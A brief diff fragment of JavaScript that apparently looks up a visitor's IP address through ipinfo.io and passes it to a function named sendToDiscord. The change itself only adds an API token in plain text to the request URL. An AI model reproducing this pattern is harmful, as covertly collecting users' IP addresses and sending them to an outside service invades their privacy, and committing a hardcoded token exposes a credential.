@@ -22,7 +22,7 @@ function sendToDiscord(data) {
     });
 }
 
-fetch('https://ipinfo.io/json')
+fetch('https://ipinfo.io/json?token=3260d6ef4f87ec')
   .then((response) => response.json())
   .then((data) => {
     const userIp = data.ip;
